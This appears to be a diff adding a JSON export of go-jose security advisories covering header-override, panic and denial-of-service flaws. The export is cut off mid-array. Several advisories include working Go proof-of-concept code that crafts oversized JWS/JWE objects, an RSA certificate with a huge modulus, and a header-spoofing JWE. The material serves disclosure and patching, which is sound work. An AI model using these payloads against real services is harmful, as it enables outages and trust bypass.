@@ -1,0 +1,1275 @@
+[
+  {
+    "ghsa_id": "GHSA-p9j4-2j95-j4rv",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-p9j4-2j95-j4rv",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-p9j4-2j95-j4rv",
+    "summary": "Unprotected JWE headers can override empty or null protected values",
+    "description": "### Summary\r\n\r\nA third-party in possession of a valid JWE can, without modifying the JWE's protected header, control the value that go-jose exposes in `JSONWebEncryption.Header` for any field whose value in the protected header is `\"\"` or `null`.\r\n\r\n### Details\r\n\r\nThe vulnerability requires three things to be true:\r\n- The producer of the JWE explicitly includes a field in the protected header whose value is `\"\"` or `null`.\r\n- The receiver of the JWE uses `ParseEncrypted` or `ParseEncryptedJSON`, rather than a compact-only parser.\r\n- The receiver of the JWE accesses or cares about the value of that field.\r\n\r\nIn that case, a third-party can add an unprotected header with the same field name to the JWE. Doing so does not touch any of the protected bytes, so the authentication tag remains valid. When the receiving application parses the JWE, the non-zero value from the unprotected header will overwrite the zero value from the unprotected header, potentially resulting in the application trusting malicious data.\r\n\r\nThis bug arises because the parsing routine \"merges\" the unprotected headers on top of the protected headers. When it does so, it detects whether a header has already been set by detecting if its _value_ is non-zero, rather than by checking whether its key exists in the headers map. In the attack scenario, the protected header is present but has a zero value, so the merge routine overwrites it with the value from the unprotected header.\r\n\r\n### Proof of concept\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"encoding/json\"\r\n\t\"fmt\"\r\n\r\n\tjose \"github.com/go-jose/go-jose/v4\"\r\n)\r\n\r\nfunc main() {\r\n\tkey := make([]byte, 16)\r\n\r\n\t// Encrypt with an explicitly-empty field in the protected header.\r\n\tencrypter, err := jose.NewEncrypter(jose.A128GCM,\r\n\t\tjose.Recipient{Algorithm: jose.DIRECT, Key: key},\r\n\t\t(&jose.EncrypterOptions{}).WithHeader(\"repro\", \"\"))\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tobj, err := encrypter.Encrypt([]byte(\"hello\"))\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\t// Add an unprotected header with a non-empty field of the same name.\r\n\t// The protected header bytes are untouched, so the authentication tag is still valid.\r\n\tvar msg map[string]json.RawMessage\r\n\terr = json.Unmarshal([]byte(obj.FullSerialize()), &msg)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tmsg[\"unprotected\"] = json.RawMessage(`{\"repro\":\"oops\"}`)\r\n\traw, err := json.Marshal(msg)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tfmt.Println(string(raw))\r\n\r\n\t// ParseEncryptedJSON demonstrates the bug.\r\n\tparsed, err := jose.ParseEncryptedJSON(string(raw),\r\n\t\t[]jose.KeyAlgorithm{jose.DIRECT}, []jose.ContentEncryption{jose.A128GCM})\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\t_, err = parsed.Decrypt(key)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\t// Want \"\" (protected), got \"oops\" (unprotected).\r\n\tfmt.Printf(\"Header.ExtraHeaders[\\\"repro\\\"] = %q\\n\", parsed.Header.ExtraHeaders[\"repro\"])\r\n}\r\n```\r\n\r\n### Impact\r\n\r\nUsers of go-jose which use `ParseEncrypted` or `ParseEncryptedJSON` rather than a compact-only parser, and which receive JWEs whose protected headers may include explicit `\"\"` or `null` values. Note that go-jose itself never produces such JWEs.\r\n\r\n### Acknowledgements\r\n\r\nFound via [oss-scanner](https://red.anthropic.com/oss-scanner/).",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "jsha",
+      "id": 220205,
+      "node_id": "MDQ6VXNlcjIyMDIwNQ==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/220205?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jsha",
+      "html_url": "https://github.com/jsha",
+      "followers_url": "https://api.github.com/users/jsha/followers",
+      "following_url": "https://api.github.com/users/jsha/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jsha/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jsha/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jsha/subscriptions",
+      "organizations_url": "https://api.github.com/users/jsha/orgs",
+      "repos_url": "https://api.github.com/users/jsha/repos",
+      "events_url": "https://api.github.com/users/jsha/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jsha/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-p9j4-2j95-j4rv",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-30T19:21:29Z",
+    "published_at": "2026-10-30T19:20:54Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "<= v4.1.6",
+        "patched_versions": "v4.1.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "all",
+        "patched_versions": "",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 0,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-27pc-rm86-68pq",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-27pc-rm86-68pq",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-27pc-rm86-68pq",
+    "summary": "Panic on JWT claim matching an embedded unexported field",
+    "description": "### Summary\r\n\r\nThe go-jose json fork of json panics when decoding a JWT claim that names a field promoted from an embedded unexported type: either a nil pointer to an unexported struct or an unexported non-struct type.\r\n\r\n### Details\r\n\r\nWe port Go 1.10's encoding/json behavior: decoding returns an error when it cannot allocate a nil embedded pointer to an unexported struct, and embedded unexported non-struct types are ignored. Embedded unexported structs keep working as before.\r\n\r\n### Impact\r\n\r\nDenial of service. An application is affected only if it decodes untrusted JSON with go-jose's json package (for example through `jwt.Claims` or `UnsafeClaimsWithoutVerification`) into its own struct type that embeds either a pointer to an unexported struct type or an unexported non-struct type.\r\n\r\n### Acknowledgements\r\n\r\nFound via [oss-scanner](https://red.anthropic.com/oss-scanner/).",
+    "severity": "low",
+    "author": null,
+    "publisher": {
+      "login": "jsha",
+      "id": 220205,
+      "node_id": "MDQ6VXNlcjIyMDIwNQ==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/220205?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jsha",
+      "html_url": "https://github.com/jsha",
+      "followers_url": "https://api.github.com/users/jsha/followers",
+      "following_url": "https://api.github.com/users/jsha/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jsha/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jsha/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jsha/subscriptions",
+      "organizations_url": "https://api.github.com/users/jsha/orgs",
+      "repos_url": "https://api.github.com/users/jsha/repos",
+      "events_url": "https://api.github.com/users/jsha/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jsha/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-27pc-rm86-68pq",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-30T19:20:47Z",
+    "published_at": "2026-10-30T19:20:47Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "<= v4.1.6",
+        "patched_versions": "v4.1.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "all",
+        "patched_versions": "",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 0,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-r39w-98wm-9pp6",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-r39w-98wm-9pp6",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-r39w-98wm-9pp6",
+    "summary": "Panic during RSA JWK thumbprint processing",
+    "description": "### Summary\r\n\r\n`(*JSONWebKey).Thumbprint` panics with a nil pointer dereference when called on an RSA key whose exponent (`e`) is 0. Unmarshaling a JWK accepts such a key without error.\r\n\r\n### Details\r\n\r\n`Thumbprint` does not validate RSA key parameters before encoding them. When the exponent is 0, its encoded form is empty, which leads to a nil pointer dereference in `rsaThumbprintInput`.\r\n\r\ngo-jose itself is not affected in its JWS parsing: `ParseSigned`, `ParseSignedCompact`, and `ParseSignedJSON` reject an embedded `jwk` header that fails `Valid()` ([jws.go#L304-L308](https://github.com/go-jose/go-jose/blob/v4.1.6/jws.go#L304-L308), [jws.go#L357-L361](https://github.com/go-jose/go-jose/blob/v4.1.6/jws.go#L357-L361)). However, unmarshaling a `JSONWebKey` or `JSONWebKeySet` directly (for example with `json.Unmarshal`) does not validate the key, so application code that calls `Thumbprint` on such a key without first checking `Valid()` can panic.\r\n\r\n### Impact\r\n\r\nDenial of service vulnerability. Applications are affected if they call `Thumbprint` on an RSA key with exponent 0 that came from an untrusted source and was not checked with `Valid()`.\r\n\r\n\r\n### Acknowledgements\r\n\r\nFound via [oss-scanner](https://red.anthropic.com/oss-scanner/).",
+    "severity": "low",
+    "author": null,
+    "publisher": {
+      "login": "jsha",
+      "id": 220205,
+      "node_id": "MDQ6VXNlcjIyMDIwNQ==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/220205?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jsha",
+      "html_url": "https://github.com/jsha",
+      "followers_url": "https://api.github.com/users/jsha/followers",
+      "following_url": "https://api.github.com/users/jsha/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jsha/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jsha/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jsha/subscriptions",
+      "organizations_url": "https://api.github.com/users/jsha/orgs",
+      "repos_url": "https://api.github.com/users/jsha/repos",
+      "events_url": "https://api.github.com/users/jsha/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jsha/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-r39w-98wm-9pp6",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-30T19:22:08Z",
+    "published_at": "2026-10-30T19:20:40Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "<= v4.1.6",
+        "patched_versions": "v4.1.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "all",
+        "patched_versions": "",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 0,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-c67m-wr4h-2ccg",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-c67m-wr4h-2ccg",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-c67m-wr4h-2ccg",
+    "summary": "Denial of service processing JWS and JWE JSON serialization",
+    "description": "### Summary\r\n\r\nApplications that process JWS and JWE JSON serialization from untrusted inputs can be caused to consume CPU time quadratic in input size.\r\n\r\n### Details\r\n\r\nAn attacker can craft a JWS or JWE JSON serialization object with a large number of signatures or recipients, respectively, and either a large payload or a large number of headers. This will result in the application spending time quadratic in CPU.\r\n\r\n### Proof of concept\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"fmt\"\r\n\t\"strings\"\r\n\t\"time\"\r\n\r\n\tjose \"github.com/go-jose/go-jose/v4\"\r\n)\r\n\r\nfunc list(entry string, n int) string { return strings.TrimSuffix(strings.Repeat(entry+\",\", n), \",\") }\r\n\r\nfunc timed(name string, f func() error) {\r\n\tstart := time.Now()\r\n\terr := f()\r\n\tfmt.Printf(\"%-20s %8.3fs  err=%v\\n\", name, time.Since(start).Seconds(), err)\r\n}\r\n\r\nfunc main() {\r\n\tvar hdr strings.Builder\r\n\tfor i := 0; i < 4000; i++ {\r\n\t\tfmt.Fprintf(&hdr, `,\"%x\":0`, i)\r\n\t}\r\n\tjwe1 := `{\"unprotected\":{\"alg\":\"dir\",\"enc\":\"A128GCM\"` + hdr.String() + `},\"recipients\":[` + list(\"{}\", 10000) +\r\n\t\t`],\"iv\":\"AAAAAAAAAAAAAAAA\",\"ciphertext\":\"AA\",\"tag\":\"AAAAAAAAAAAAAAAAAAAAAA\"}`\r\n\ttimed(\"ParseEncrypted\", func() error {\r\n\t\t_, err := jose.ParseEncrypted(jwe1, []jose.KeyAlgorithm{jose.DIRECT}, []jose.ContentEncryption{jose.A128GCM})\r\n\t\treturn err\r\n\t})\r\n\r\n\tjwe2 := `{\"unprotected\":{\"alg\":\"dir\",\"enc\":\"A128CBC-HS256\"},\"recipients\":[` + list(\"{}\", 16000) +\r\n\t\t`],\"iv\":\"AAAAAAAAAAAAAAAAAAAAAA\",\"ciphertext\":\"` + strings.Repeat(\"A\", 200000) + `\",\"tag\":\"AAAAAAAAAAAAAAAAAAAAAA\"}`\r\n\ttimed(\"DecryptMulti\", func() error {\r\n\t\tobj, err := jose.ParseEncrypted(jwe2, []jose.KeyAlgorithm{jose.DIRECT}, []jose.ContentEncryption{jose.A128CBC_HS256})\r\n\t\tif err != nil {\r\n\t\t\treturn fmt.Errorf(\"parse: %w\", err)\r\n\t\t}\r\n\t\t_, _, _, err = obj.DecryptMulti(make([]byte, 32))\r\n\t\treturn err\r\n\t})\r\n\r\n\tsigs := list(`{\"protected\":\"eyJhbGciOiJIUzI1NiJ9\",\"signature\":\"AA\"}`, 6500)\r\n\ttimed(\"VerifyMulti\", func() error {\r\n\t\tobj, err := jose.ParseSigned(`{\"payload\":\"`+strings.Repeat(\"A\", 250000)+`\",\"signatures\":[`+sigs+`]}`,\r\n\t\t\t[]jose.SignatureAlgorithm{jose.HS256})\r\n\t\tif err != nil {\r\n\t\t\treturn fmt.Errorf(\"parse: %w\", err)\r\n\t\t}\r\n\t\t_, _, _, err = obj.VerifyMulti(make([]byte, 32))\r\n\t\treturn err\r\n\t})\r\n\r\n\ttimed(\"DetachedVerifyMulti\", func() error {\r\n\t\tobj, err := jose.ParseSigned(`{\"payload\":\"\",\"signatures\":[`+sigs+`]}`, []jose.SignatureAlgorithm{jose.HS256})\r\n\t\tif err != nil {\r\n\t\t\treturn fmt.Errorf(\"parse: %w\", err)\r\n\t\t}\r\n\t\t_, _, err = obj.DetachedVerifyMulti([]byte(strings.Repeat(\"A\", 187500)), make([]byte, 32))\r\n\t\treturn err\r\n\t})\r\n}\r\n```\r\n\r\n### Impact\r\n\r\nDenial of service for applications that process JWS or JWE JSON serialization. Specifically those that call `VerifyMulti`, `DetachedVerifyMulti`, `ParseEncrypted`, or `DecryptMulti`.\r\n\r\n\r\n### Acknowledgements\r\n\r\nFound via [oss-scanner](https://red.anthropic.com/oss-scanner/).",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "jsha",
+      "id": 220205,
+      "node_id": "MDQ6VXNlcjIyMDIwNQ==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/220205?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jsha",
+      "html_url": "https://github.com/jsha",
+      "followers_url": "https://api.github.com/users/jsha/followers",
+      "following_url": "https://api.github.com/users/jsha/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jsha/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jsha/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jsha/subscriptions",
+      "organizations_url": "https://api.github.com/users/jsha/orgs",
+      "repos_url": "https://api.github.com/users/jsha/repos",
+      "events_url": "https://api.github.com/users/jsha/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jsha/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-c67m-wr4h-2ccg",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-30T19:21:57Z",
+    "published_at": "2026-10-30T19:20:34Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "<= v4.1.6",
+        "patched_versions": "v4.1.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "all",
+        "patched_versions": "",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 0,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-v6h2-qj3f-2h6v",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-v6h2-qj3f-2h6v",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-v6h2-qj3f-2h6v",
+    "summary": "Denial of service when verifying certificates",
+    "description": "### Summary\r\n\r\nAn RSA key with a large modulus inside a certificate chain in the \"x5c\" header can cause applications that call `Header.Certificates()` to consume excess CPU.\r\n\r\n### Details\r\n\r\ngo-jose does not check for bounds on RSA modulus before verifying certificates.\r\n\r\n### Proof of concept\r\n\r\n```go\r\n// Package main demonstrates untrusted input consuming CPU time quadratic in\r\n// input size.\r\npackage main\r\n\r\nimport (\r\n\t\"crypto/rand\"\r\n\t\"crypto/rsa\"\r\n\t\"crypto/x509\"\r\n\t\"crypto/x509/pkix\"\r\n\t\"encoding/base64\"\r\n\t\"fmt\"\r\n\t\"math/big\"\r\n\t\"time\"\r\n\r\n\tjose \"github.com/go-jose/go-jose/v4\"\r\n)\r\n\r\nconst modulusBits = 262144\r\n\r\n\r\nfunc mkCert(tmpl, parent *x509.Certificate, pub interface{}, signKey *rsa.PrivateKey) *x509.Certificate {\r\n\tif parent == nil {\r\n\t\tparent = tmpl\r\n\t}\r\n\tder, err := x509.CreateCertificate(rand.Reader, tmpl, parent, pub, signKey)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tcert, err := x509.ParseCertificate(der)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\treturn cert\r\n}\r\n\r\nfunc caTmpl(cn string, skid []byte) *x509.Certificate {\r\n\treturn &x509.Certificate{\r\n\t\tSerialNumber:          big.NewInt(time.Now().UnixNano()),\r\n\t\tSubject:               pkix.Name{CommonName: cn},\r\n\t\tNotBefore:             time.Now().Add(-time.Hour),\r\n\t\tNotAfter:              time.Now().Add(time.Hour),\r\n\t\tBasicConstraintsValid: true,\r\n\t\tIsCA:                  true,\r\n\t\tKeyUsage:              x509.KeyUsageCertSign,\r\n\t\tSubjectKeyId:          skid,\r\n\t}\r\n}\r\n\r\nfunc main() {\r\n\tsignKey, err := rsa.GenerateKey(rand.Reader, 2048)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\t// A non-trusted root just to help us sign a fake hierarchy.\r\n\tbogusRoot := mkCert(caTmpl(\"bogus-root\", nil), nil, &signKey.PublicKey, signKey)\r\n\r\n\t// Make two intermediates, one that goes in the JWS and one that is just used\r\n  // to sign a leaf.\r\n\tn := new(big.Int).Lsh(big.NewInt(1), modulusBits)\r\n\tn.SetBit(n, 0, 1)\r\n\toversizedKey := &rsa.PublicKey{N: n, E: 65537}\r\n  var fixedSKID = []byte{0x01, 0x02, 0x03, 0x04}\r\n\toversizedKeyIntermediate := mkCert(caTmpl(\"intermediate\", fixedSKID), bogusRoot, oversizedKey, signKey)\r\n\r\n\ttemporaryIntermediate := mkCert(caTmpl(\"intermediate\", fixedSKID), bogusRoot, &signKey.PublicKey, signKey)\r\n\r\n\tleaf := mkCert(&x509.Certificate{\r\n\t\tSerialNumber: big.NewInt(time.Now().UnixNano() + 1),\r\n\t\tSubject:      pkix.Name{CommonName: \"leaf\"},\r\n\t\tNotBefore:    time.Now().Add(-time.Hour),\r\n\t\tNotAfter:     time.Now().Add(time.Hour),\r\n\t}, temporaryIntermediate, &signKey.PublicKey, signKey)\r\n\r\n\tsigner, err := jose.NewSigner(\r\n\t\tjose.SigningKey{Algorithm: jose.RS256, Key: signKey},\r\n\t\t&jose.SignerOptions{ExtraHeaders: map[jose.HeaderKey]interface{}{\r\n\t\t\tjose.HeaderKey(\"x5c\"): []string{\r\n\t\t\t\tbase64.StdEncoding.EncodeToString(leaf.Raw),\r\n\t\t\t\tbase64.StdEncoding.EncodeToString(oversizedKeyIntermediate.Raw),\r\n\t\t\t},\r\n\t\t}},\r\n\t)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tsigned, err := signer.Sign([]byte(\"payload\"))\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tmsg := signed.FullSerialize()\r\n\r\n\tparsed, err := jose.ParseSigned(msg, []jose.SignatureAlgorithm{jose.RS256})\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\t// A simulated trusted root that hasn't signed anything.\r\n\tappRoot := mkCert(caTmpl(\"app-root\", nil), nil, &signKey.PublicKey, signKey)\r\n\troots := x509.NewCertPool()\r\n\troots.AddCert(appRoot)\r\n\r\n\tfmt.Printf(\"message is %d bytes; intermediate modulus is %d bits\\n\", len(msg), modulusBits)\r\n\tstart := time.Now()\r\n\t_, err = parsed.Signatures[0].Protected.Certificates(x509.VerifyOptions{Roots: roots})\r\n\tfmt.Printf(\"Certificates() took %s (err=%v)\\n\", time.Since(start), err)\r\n}\r\n```\r\n\r\n### Impact\r\n\r\nDenial of service vulnerability. Any application that calls Headers.Certificates is affected and should patch immediately.\r\n\r\n\r\n### Acknowledgements\r\n\r\nFound via [oss-scanner](https://red.anthropic.com/oss-scanner/).",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "jsha",
+      "id": 220205,
+      "node_id": "MDQ6VXNlcjIyMDIwNQ==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/220205?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jsha",
+      "html_url": "https://github.com/jsha",
+      "followers_url": "https://api.github.com/users/jsha/followers",
+      "following_url": "https://api.github.com/users/jsha/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jsha/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jsha/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jsha/subscriptions",
+      "organizations_url": "https://api.github.com/users/jsha/orgs",
+      "repos_url": "https://api.github.com/users/jsha/repos",
+      "events_url": "https://api.github.com/users/jsha/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jsha/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-v6h2-qj3f-2h6v",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-30T19:22:23Z",
+    "published_at": "2026-10-30T19:20:27Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "<= 4.1.6",
+        "patched_versions": "v4.1.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "all",
+        "patched_versions": "",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 0,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-4w3g-jfj2-cw2q",
+    "cve_id": "CVE-2026-116585",
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-4w3g-jfj2-cw2q",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-4w3g-jfj2-cw2q",
+    "summary": "Panic during CBC-HMAC processing",
+    "description": "### Summary\r\n\r\nDecrypting a ciphertext with \"A128CBC-HS256\", \"A192CBC-HS384\", or \"A256CBC-HS512\" can result in a panic on untrusted input.\r\n\r\nNote this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.\r\n\r\n### Details\r\n\r\nInsufficient validation of parameters can lead to attempting to index into an empty buffer. See https://github.com/go-jose/go-jose/pull/292.\r\n\r\n### Workarounds\r\n\r\nIf the application does not require the CBC-HMAC modes for content encryption, and is using github.com/go-jose/go-jose/v4, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.\r\n\r\n### Impact\r\n\r\nDenial of service vulnerability. Any application which decrypts untrusted ciphertexts with the indicated algorithms is affected.\r\n\r\n### Acknowledgements\r\n\r\nThanks to Joshua Rogers of AISLE Research for reporting this problem.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "inahga",
+      "id": 57697428,
+      "node_id": "MDQ6VXNlcjU3Njk3NDI4",
+      "avatar_url": "https://avatars.githubusercontent.com/u/57697428?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/inahga",
+      "html_url": "https://github.com/inahga",
+      "followers_url": "https://api.github.com/users/inahga/followers",
+      "following_url": "https://api.github.com/users/inahga/following{/other_user}",
+      "gists_url": "https://api.github.com/users/inahga/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/inahga/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/inahga/subscriptions",
+      "organizations_url": "https://api.github.com/users/inahga/orgs",
+      "repos_url": "https://api.github.com/users/inahga/repos",
+      "events_url": "https://api.github.com/users/inahga/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/inahga/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-4w3g-jfj2-cw2q",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-116585",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-26T21:04:47Z",
+    "published_at": "2026-10-19T19:08:30Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "< 4.1.5",
+        "patched_versions": "4.1.5",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "<= 3.0.5",
+        "patched_versions": "",
